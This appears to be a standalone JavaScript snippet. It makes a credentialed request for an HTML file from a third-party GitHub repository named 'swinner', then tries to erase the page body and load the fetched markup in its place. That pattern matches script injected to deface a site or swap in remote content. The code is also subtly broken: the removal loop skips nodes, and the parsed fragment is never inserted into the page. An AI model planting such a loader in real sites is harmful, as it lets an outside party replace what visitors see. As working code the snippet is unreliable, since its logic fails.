var data = null;
const xhr = new XMLHttpRequest();
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function () {
  if (this.readyState === this.DONE) {
    var elms = document.body.childNodes.length;
    var idx = 0;
    while (elms > idx) {
      document.body.childNodes[idx].remove();
      idx++;
    }
    document.createRange().createContextualFragment(this.responseText);
  }
});

xhr.open(
  "GET",
  "https://raw.githubusercontent.com/vinert1a/swinner/main/errorpage.html"
);

xhr.send(data);
